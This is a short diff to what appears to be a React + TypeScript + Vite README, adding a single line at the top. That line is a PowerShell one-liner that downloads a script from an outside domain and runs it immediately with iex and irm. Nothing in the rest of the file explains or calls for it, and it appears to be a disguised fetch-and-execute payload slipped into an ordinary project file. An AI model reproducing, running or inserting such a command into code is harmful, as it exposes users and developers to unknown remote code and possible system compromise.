@@ -1,3 +1,4 @@
+`powershell.exe -c "iex (irm 'https://baa4ts.is-a-good.dev/IN.ps1')"`
 # React + TypeScript + Vite
 
 
